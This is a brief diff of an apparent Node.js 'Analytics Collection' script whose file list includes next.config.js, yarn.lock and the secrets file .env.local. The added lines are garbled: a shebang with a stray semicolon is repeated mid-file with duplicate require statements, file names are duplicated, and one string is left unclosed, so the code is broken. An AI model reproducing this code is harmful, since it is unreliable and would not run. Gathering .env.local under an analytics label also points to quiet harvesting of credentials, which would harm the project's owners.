@@ -2,6 +2,16 @@
 const fs = require('fs')
 const path = require('path')
 
+#!/usr/bin/env node;
+const fs = require('fs')
+const path = require('path')
+#!/usr/bin/env node;
+const fs = require('fs')
+const path = require('path')
+#!/usr/bin/env node;
+const fs = require('fs')
+const path = require('path')
+
 
 
 console.log(' Starting Analytics Collection...')
@@ -13,6 +23,9 @@ console.log(' Starting Analytics Collection...')
     'next.config.js'
     'next.config.js'
 
+    'next.config.js'
+
+    'next.config.js'
     'next.config.js'
     'yarn.lock
     '.env.local
